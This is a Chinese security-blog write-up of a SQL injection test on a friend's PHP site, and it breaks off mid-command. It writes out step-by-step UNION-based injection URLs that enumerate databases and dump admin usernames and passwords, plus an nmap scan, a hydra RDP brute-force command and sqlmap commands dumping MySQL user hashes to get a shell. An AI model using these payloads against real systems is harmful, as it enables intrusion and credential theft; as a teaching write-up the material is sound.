---
title: 记一次峰回路转的注入
url: https://www.secpulse.com/archives/199819.html
source: 安全脉搏
date: 2023-05-05
fetch_date: 2025-10-04T11:37:55.768366
---

# 记一次峰回路转的注入

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 记一次峰回路转的注入

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-05-04

8,120

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182468.gif "跳跃猫引导关注")

1

**0X01 背景**

##

"

自己之前写过一篇记录，当时是由于之前是一位校友刚做开发，叫我友情帮忙测试测试一波，由于是开发的新手，漏洞比较多，所以直接从注入开始讲起，但是到getshell的过程也算是一场峰回路转再跌跌撞撞的路程。

"

2

**0x02 注入测试**

##

判断注入是否存在

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229or '1'='1'

显示数据

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182469.jpg)

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229or '1'='2'

显示非原本数据

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182470.jpg)

判断存在sql注入后，通过orderby 子句判断有几个字段

Order by从1开始，大概选个数逐个去尝试，二分法是最普通的，还可以开根法，还有是方程式法，再好玩一点就动态规划。推荐下面这篇文章，非常有趣，很好懂。

https://mp.weixin.qq.com/s/nMC55qvgsQNQfncAEOM20Q

试到前一个数返回正常，后一个报错，就说明长度是多少了，示例如下

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229order by 27

返回正常

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182471.jpg)

那试试payload

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229order by 28

28返回不正常

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182472.jpg)

那么可以说明他字段个数是27，而且后面要用到这个数字。

第二步：联合查询

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27

提交后，可以看到页面中出现可以被显示的字段编号，我们通过在响应位置替换成我们需要的查询字段和表就可以了。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-16831824721.jpg)

对应的数字就会显示在页面中，我把对应数字改成sql语句，就会得到sql查询结果

举例子：

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,22,23,24,25,26,27

知识点补充：

database()查看当前数据库

@@version查询mysql版本

@@datadir查询数据库路径

我把原来的5，15，21改成查数据库名，mysql版本，数据路径，就会在相应的地方显示出来

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182473.jpg)

查询所有数据库名：group\_concat(SCHEMA\_NAME)

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group\_concat(SCHEMA\_NAME),23,24,25,26,27from information\_schema.schemata

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182474.jpg)

查询当前数据库所有表名：group\_concat(table\_name)

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group\_concat(table\_name),23,24,25,26,27from information\_schema.tables where table\_schema=database()

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182475.jpg)

上述图发现表名：admin，

要查询查询表中的字段先把表名转换为16进制（标黄为表名的16进制转换值）

group\_concat(column\_name)

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group\_concat(column\_name),23,24,25,26,27from information\_schema.columns where table\_name=0x61646D696E

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182475.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182476.jpg)

发现其字段有

 user\_id,username,userpassword

下一步只需要查询username和userpassword即可

group\_concat(username,0x7c,userpassword)

http://11X.XX.XXX.XX/test/sub\_hack.php?id=229and 1=2 UNION SELECT1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,@@datadir,group\_concat(username,0x7c,userpassword),23,24,25,26,27from admin

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182477.jpg)

##

3

**0x03 峰回路转**

##

到此，我们知道了知道用户名为admin，密码为123了

在之前已经在信息收集的地方收集到后台了，然后尝试登陆，登陆成功了

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182478.jpg)

登进后台发现，是真的没有上传地方阿，也没有其他包含，redis其他服务，学信息安全的男生都不会轻易认输，再查看之前的扫描结果，灵机一动还有一根救命稻草，3389！

nmap -Pn -v -p 330611X.XX.XXX.XX

Starting Nmap 7.10 (https://nmap.org ) at 2015-04-04 22:54

mass\_dns: warning:Unable to determine any DNS servers. Reverse DNS is disabled. Tryusing --system-dns or specify valid servers with --dns-servers

Initiating SYNStealth Scan at 22:54

Scanning11X.XX.XXX.XX [1000 port]

Completed SYNStealth Scan at 22:54, 0.18s elapsed (1 total ports)

Nmap scan report for11X.XX.XXX.XX

Host is up (0.013slatency).

PORT     STATESERVICE

80/tcp open  http

3306/tcp open  mysql

3389/tcp open ms-wbt-server

拿出我的字典，再拿出我的hydra，快速在pentestbox敲下：

hydra -LF:cybersecusrname.txt -P F:cybersec password.txt -Vv -t 1 -w 3 -W5 11X.XX.XXX.XX rdp

结果跑了自己一个心灰意冷，毫无结果。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182479.jpeg)

不过还发现开放3306端口，不是有注入吗，直接连数据库getshell呀

太心急想getshell不一步步手工了，sqlmap走起

“

查看权限

sqlmap-u http:// 11X.XX.XXX.XX /test/sub\_hack.php?id=231 --current-user--dbms=mysql -v 3

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182479.jpg)

current user:   'root@localhost'

当前用户是root

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199819-1683182480.jpg)

引发报错找到绝对路径+root权限那我是不是可以写shell了

sqlmap-r C:Userssqlpost.txt --time-sec 3 --dbms=mysql --random-agent -Dmysql -T user -C User,Password --dump

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-cont...